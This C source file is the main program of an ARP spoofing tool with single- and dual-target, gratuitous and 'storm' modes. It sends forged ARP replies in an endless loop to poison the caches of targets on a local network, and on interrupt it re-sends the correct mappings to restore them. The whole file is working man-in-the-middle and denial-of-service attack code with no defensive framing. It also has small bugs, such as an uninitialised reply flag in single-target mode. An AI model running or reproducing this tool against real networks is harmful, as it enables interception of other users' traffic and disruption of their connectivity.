#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <getopt.h>
#include <signal.h>

#include "arp.h"
#include "netutil.h"
#include "parse.h"

#define DELAY_MIN 100
#define DELAY_MAX 500 

const char * help_msg = "help message\n-g - gratuitous\n -t - target, etc";
const char * optstring = "hdgsa:b:t:i:m:M:";
const struct option long_opts[] = {
	{"help", no_argument, 0, 'h'},
	{"target-a", required_argument, 0, 'a'},
	{"target-b", required_argument, 0, 'b'},
	{"dual-target", no_argument, 0, 'd'},
	{"target", required_argument, 0, 't'},
	{"gratuitous", no_argument, 0, 'g'},
	{"interface", required_argument, 0, 'i'},
	{"rand-min", required_argument, 0, 'm'},
	{"rand-max", required_argument, 0, 'M'},
	{"storm", no_argument, 0, 's'},
	{0, 0, 0, 0}
};

typedef struct {
	int fd;
	char * interface;
	char * ip_a;
	char * ip_b;
	uint8_t *  mac_src;
	uint8_t * mac_dst_a;
	uint8_t * mac_dst_b;
} cleanup_data_t;

volatile cleanup_data_t cleanup_data = {0};

void cleanup_handler(int sig) {
	int fd = cleanup_data.fd;
	char * interface = cleanup_data.interface;
	char * ip_a = cleanup_data.ip_a;
	char * ip_b = cleanup_data.ip_b;
	uint8_t * mac_src = cleanup_data.mac_src;
	uint8_t * mac_dst_a = cleanup_data.mac_dst_a;
	uint8_t * mac_dst_b = cleanup_data.mac_dst_b;
	uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

	arp_ctx_t arp_ctx_a = {0};
	arp_ctx_t arp_ctx_b = {0};

	if(cleanup_data.ip_b) {
		arp_ctx_a.src_ip = ip_b;
		arp_ctx_a.dst_ip = ip_a;
		arp_ctx_b.src_ip = ip_a;
		arp_ctx_b.dst_ip = ip_b;
		
		arp_ctx_a.src_mac = mac_dst_b;
		arp_ctx_b.src_mac = mac_dst_a;

		arp_ctx_a.dst_mac = broadcast_mac;
		arp_ctx_b.dst_mac = broadcast_mac;
	}	
	else {
		arp_ctx_a.src_ip = ip_a;
		arp_ctx_a.dst_ip = ip_a;
		arp_ctx_a.src_mac = mac_dst_a;
		arp_ctx_a.dst_mac = broadcast_mac;
	}
	
	for(int i = 0; i < 3; i++) {
		if(cleanup_data.ip_b)
			arp_reply(fd, interface, arp_ctx_b);
		
		arp_reply(fd, interface, arp_ctx_a);
		
		usleep(333 * 1000);
	}

	exit(sig);
}

int main(int argc, char * argv[]) {	
	bool is_dual_target = 0;
	bool is_gratuitous = 0;
	bool is_arp_storm = 0;	

	uint8_t src_mac[6];
	uint8_t dst_mac_a[6];
	uint8_t dst_mac_b[6];
	uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

	char * interface = 0;

	int opt = 0;
	int fd = 0;	
	int rand_min = DELAY_MIN;
	int rand_max = DELAY_MAX;

	arp_ctx_t arp_ctx_a = {0};
	arp_ctx_t arp_ctx_b = {0};

	char if_path[256];

	for (;;) {
		opt = getopt_long(argc, argv, optstring, long_opts, &opt);
		
		if(opt == -1)
			break;
		
		switch(opt) {
			case 'h':
				fprintf(stderr, "%s", help_msg);
				exit(0);
			case 'a':
				arp_ctx_a.dst_ip = optarg;
				break;
			case 'b':
				arp_ctx_b.dst_ip = optarg;
				break;
			case 'd':
				is_dual_target = 1;
				break;
			case 't':			
				arp_ctx_a.dst_ip = optarg;
				break; 
			case 'g':
				is_gratuitous = 1;
				break;
			case 'i':
				interface = optarg;
				break;
			case 'm':
				rand_min = atoi(optarg);
				break;
			case 'M':
				rand_max = atoi(optarg);
				break;
			case 's':
				is_arp_storm = 1;
				break;
			default:
				break;
		}
	}
	
	if(check_targets_ip(arp_ctx_a.dst_ip, arp_ctx_b.dst_ip, is_dual_target))
		exit(1);

	if(check_rand_ranges(rand_min, rand_max))
		exit(1);

	if(check_interface(interface))
		exit(1);

	fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	
	if(fd < 0) {
		fprintf(stderr, "[X] Error: Unable to create socket: %s\n", strerror(errno));
		exit(1);
	}
	
	if(get_local_mac(fd, interface, src_mac)) {
		fprintf(stderr, "[!] Can not fetch device mac address\n");
		exit(1);
	}
	

	if(is_dual_target) {
		bool resolve_a = 0;
		bool resolve_b = 0;
		
		arp_ctx_a.src_mac = src_mac;
		arp_ctx_a.dst_mac = dst_mac_b;
		arp_ctx_b.dst_mac = dst_mac_a;
		arp_ctx_b.src_mac = src_mac;

		resolve_a = arp_resolve(fd, interface, arp_ctx_a);
		resolve_b = arp_resolve(fd, interface, arp_ctx_b);

		if(resolve_a)
			fprintf(stderr, "[!] Unable to resolve target %s\n", arp_ctx_a.dst_ip);
		if(resolve_b)
			fprintf(stderr, "[!] Unable to resolve target %s\n", arp_ctx_b.dst_ip);
		
		if(resolve_a || resolve_b) {
			fprintf(stderr, "[!] One or more targets not resolved\n");
			exit(1);
		}
	}
	else {
		arp_ctx_a.src_mac = src_mac;
		arp_ctx_a.dst_mac = dst_mac_a;	
		bool resolve = arp_resolve(fd, interface, arp_ctx_a);

		if(resolve) {
			fprintf(stderr, "[!] Unable to resolve target %s\n", arp_ctx_a.dst_ip);
			fprintf(stderr, "[!] Target not resolved\n");
			exit(1);
		}
	}
	
	cleanup_data.fd = fd;
	cleanup_data.interface = interface;
	cleanup_data.ip_a = arp_ctx_a.dst_ip;
	cleanup_data.ip_b = arp_ctx_b.dst_ip;
	cleanup_data.mac_src = src_mac;
	cleanup_data.mac_dst_a = dst_mac_a;
	cleanup_data.mac_dst_b = dst_mac_b;
	
	if(is_dual_target) {
		if(is_gratuitous) {
			arp_ctx_a.src_ip = arp_ctx_b.dst_ip;
			arp_ctx_a.dst_mac = broadcast_mac;
			arp_ctx_b.dst_mac = broadcast_mac;
			arp_ctx_b.src_ip = arp_ctx_b.dst_ip;
		}
		else {
			arp_ctx_a.dst_mac = dst_mac_b;
			arp_ctx_a.src_ip = arp_ctx_b.dst_ip;
			arp_ctx_b.dst_mac = dst_mac_a;
			arp_ctx_b.src_ip = arp_ctx_a.dst_ip;
		}
	}
	else {
		arp_ctx_a.src_ip = arp_ctx_a.dst_ip;
		arp_ctx_a.dst_mac = broadcast_mac;
	}

	signal(SIGINT, cleanup_handler);	
	
	srandom(time(NULL));

	for(;;) {
		uint16_t delay_ms = rand_min + random() % (rand_max - rand_min);
		bool reply_a, reply_b;
		
		if(is_dual_target) {
			reply_a = arp_reply(fd, interface, arp_ctx_a);
			reply_b = arp_reply(fd, interface, arp_ctx_b);
		}	
		else {
			reply_a = arp_reply(fd, interface, arp_ctx_a);
		}

		if(reply_a || reply_b) {
			fprintf(stderr, "ARP send falled, exiting without cleanup!\n");
			exit(1);
		}	

		if(!is_arp_storm)
			usleep(delay_ms * 1000);
	}

	close(fd);
	return 0;
}	
